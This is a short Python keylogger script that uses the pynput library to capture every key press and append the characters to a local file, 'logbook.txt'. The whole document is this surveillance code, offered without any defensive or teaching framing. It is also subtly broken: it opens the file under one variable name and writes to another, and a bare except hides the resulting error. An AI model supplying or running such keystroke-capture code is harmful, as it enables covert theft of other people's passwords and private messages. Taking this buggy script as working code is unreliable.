from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("logbook.txt", "a") as logBook:
        try:
            char = key.char
            logbook.write(char)
        except:
            print("error getting char")
            
            
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()